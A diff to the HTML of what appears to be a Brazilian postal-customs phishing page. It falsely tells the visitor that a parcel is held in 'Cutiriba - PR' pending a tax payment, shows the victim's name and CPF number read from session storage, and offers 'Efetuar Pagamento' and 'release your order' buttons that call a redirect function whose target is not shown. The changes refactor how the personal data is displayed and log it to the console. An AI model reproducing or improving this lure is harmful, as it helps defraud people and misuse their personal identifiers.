@@ -1,5 +1,3 @@
-
-
 <html lang="pt-BR">
 
 <head>
@@ -31,51 +29,102 @@
 </head>
 
 <body class="">
-<script>
-    document.addEventListener("DOMContentLoaded", () => {
-        const cpf = sessionStorage.getItem("cpf") || "CPF não disponível";
-        const nome = sessionStorage.getItem("nome") || "Nome não disponível";
-        const dataAtual = sessionStorage.getItem("data_atual") || "Data Indisponível";
+    <script>
+        document.addEventListener("DOMContentLoaded", () => {
+            console.log("DADOS");
 
-        document.getElementById("cpf_info").innerText = cpf;
-        document.getElementById("nome_info").innerText = nome;
-        document.getElementById("data_info").innerText = dataAtual;
-    });
-</script>
+            const cpf = sessionStorage.getItem("cpf") || "CPF não disponível";
+            const nome = sessionStorage.getItem("nome") || "Nome não disponível";
+
+
+            const dataAtual = new Date().toLocaleDateString("pt-BR");
+
+            console.log("CPF:", cpf);
+            console.log("Nome:", nome);
+            console.log("Data Atual:", dataAtual);
+
+            if (document.getElementById("nome_info")) {
+                document.getElementById("nome_info").innerText = nome;
+            }
+            if (document.getElementById("nome_info2")) {
+                document.getElementById("nome_info2").innerText = nome;
+            }
+
+            if (document.getElementById("cpf_info")) {
+                document.getElementById("cpf_info").innerText = cpf;
+            }
+            if (document.getElementById("cpf_info2")) {
+                document.getElementById("cpf_info2").innerText = cpf;
+            }
+
+            if (document.getElementById("data_info")) {
+                document.getElementById("data_info").innerText = dataAtual;
+            }
+        });
+
+    </script>
+
     <div id="site" tyle="white-space: normal;">
         <div id="b_1225979_1_1736606248678282284c60c" class="gpc-b" style="white-space: normal;">
             <div class="gpc-b_sobreposicao"></div>
         </div>
+
         <div id="b_1225979_1_1736606248678282284c5df" class="gpc-b " style="white-space: normal;">
             <div class="gpc-b_sobreposicao"></div>
             <div class="centralizar">
+
                 <div id="e_1225979_1_57686_m" class="gpc-e e_imagem dm e_1225979_1_57686">
                     <div class="c imagem e_imagem">
                         <div class="imagem_fundo"></div>
                     </div>
                 </div>
+
                 <div id="e_1225979_1_60477_m" class="gpc-e e_texto dm dm e_1225979_1_60477"
                     style="white-space: normal;">
                     <div class="c e_texto" style="white-space: normal;">
-                        <p><span><br></span></p>
-                        <p><span><br><span id="nome_info">Nome não disponível</span></span></p>
+                        <p>
+                            <span>
+                                <br>
+                            </span>
+                        </p>
+                        <p>
+                            <span>
+                                <br>
+                                <span id="nome_info"></span>
+                            </span>
+                        </p>
                     </div>
                 </div>
+
+
                 <div id="e_1225979_1_51231_m" class="gpc-e e_texto dm dm e_1225979_1_51231"
                     style="white-space: normal;">
                     <div class="c e_texto" style="white-space: normal;">
                         <br>
                         <br>
-                        <p style="white-space: normal;"><span><b>ENCOMENDA TRIBUTADA</b></span></p>
+                        <p style="white-space: normal;">
+                            <span>
+                                <b>ENCOMENDA TRIBUTADA</b>
+                            </span>
+                        </p>
                     </div>
                 </div>
+
+
                 <div id="e_1225979_1_75116_m" class="gpc-e e_texto dm dm e_1225979_1_75116"
                     style="white-space: normal;">
                     <div class="c e_texto" style="white-space: normal;">
-                        <p><span><br><br></span></p>
-                        <p id="cpf_info">CPF não disponível</p>
+                        <p>
+                            <span>
+                                <br>
+                                <br>
+                            </span>
+                        </p>
+                        <p id="cpf_info"></p>
                     </div>
                 </div>
+
+
                 <div id="e_1225979_1_83162_m" class="gpc-e e_texto dm dm e_1225979_1_83162"
                     style="white-space: normal;">
                     <div class="c e_texto" style="white-space: normal;">
@@ -83,51 +132,72 @@
                         <p><b><br></b></p>
                     </div>
                 </div>
+
+
                 <div id="e_1225979_1_24573_m" class="gpc-e e_texto dm dm e_1225979_1_24573"
                     style="white-space: normal;">
                     <div class="c e_texto" style="white-space: normal;">
                         <p><span>Status da entrega: <b>Aguardando Pagamento</b></span></p>
                     </div>
                 </div>
+
+
                 <div id="e_1225979_1_10156_m" class="gpc-e e_texto dm dm e_1225979_1_10156"
                     style="white-space: normal;">
                     <div class="c e_texto" style="white-space: normal;">
                         <p><span><b>Sua encomenda está retida na agência dos correios em Cutiriba - PR</b></span></p>
                     </div>
                 </div>
+
+
                 <div id="e_1225979_1_16907_m" class="gpc-e e_imagem dm e_1225979_1_16907" style="white-space: normal;">
                     <div class="c imagem e_imagem" style="white-space: normal;">
                         <div class="imagem_fundo"></div>
                     </div>
                 </div>
+
+
                 <div id="e_1225979_1_23145_m" class="gpc-e e_titulo dm dm e_1225979_1_23145"
                     style="white-space: normal;">
                     <div class="c e_titulo" style="white-space: normal;">
                         <h1><span>Receber até dia <b>11/03/2025</b><b> </b>após o pagamento</span></h1>
                     </div>
                 </div>
+
+
                 <div id="e_1225979_1_34836_m" class="gpc-e e_titulo dm dm e_1225979_1_34836">
                     <div class="c e_titulo" style="white-space: normal;">
-                        <h2><b><a onclick="redirect(event)"
-                                    class="link_externo" id="c3641828-69dd-515d-aa72-725a4ec5112c">Efetuar
+                        <h2><b><a onclick="redirect(event)" class="link_externo"
+                                    id="c3641828-69dd-515d-aa72-725a4ec5112c">Efetuar
                                     Pagamento</a></b></h2>
                     </div>
                 </div>
+
+
                 <div id="e_1225979_1_65553" class="gpc-e e_texto dd dm e_1225979_1_65553" style="white-space: normal;">
                     <div class="c e_texto" style="white-space: normal;">
-                        <p><span>Nome Completo:</span></p>
-                        <p><span><b><span id="nome_info">Nome não disponível</span><br><br></b>CPF:<b> <span id="cpf_info">CPF não disponível</span><br><br></b>Prazo para
-                                regularização:<b>
-                                <p><span id="data_info">Data Indisponível</span></p>
-                            </b></span></p>
+                        <p>
+                            <span>Nome Completo:</span><br>
+                            <span id="nome_info2"></span>
+                        <p>
+                            <br>
+                            <span style="margin-bottom: 3%;">CPF: <br><b><span id="cpf_info2"></span></b>
+                                <br>
+                                <br>
+                                </b><span>Prazo para regularização:</span>
+                                <p>
+                                    <b></b><span id="data_info">Data Indisponível</span></b>
+                                </p>
+
+                            </span>
+                        </p>
                     </div>
                 </div>
                 <br><br>
                 <div id="e_1225979_1_28606" class="gpc-e e_botao dd dm e_1225979_1_28606" style="white-space: normal;">
                     <br>
-                    <a class="c borda_igual e_botao link_externo"
-                        onclick="redirect(event)"
-                         style="white-space: normal;">CLIQUE AQUI PARA LIBERAR
+                    <a class="c borda_igual e_botao link_externo" onclick="redirect(event)"
+                        style="white-space: normal;">CLIQUE AQUI PARA LIBERAR
                         SEU PEDIDO</a>
                 </div>
                 <div id="e_1225979_1_53338" class="gpc-e e_imagem dd dm e_1225979_1_53338" style="white-space: normal;">
@@ -201,8 +271,7 @@
                 </div>
                 <div id="e_1225979_1_34836_d" class="gpc-e e_titulo dd e_1225979_1_34836" style="white-space: normal;">
                     <div class="c e_titulo" style="white-space: normal;">
-                        <h2><b><a onclick="redirect(event)"
-                                    class="link_externo" >Efetuar
+                        <h2><b><a onclick="redirect(event)" class="link_externo">Efetuar
                                     Pagamento</a></b></h2>
                     </div>
                 </div>
@@ -210,7 +279,6 @@
         </div>
     </div>
     <style>
-        
         .stuck {
             position: fixed;
             width: 100%;
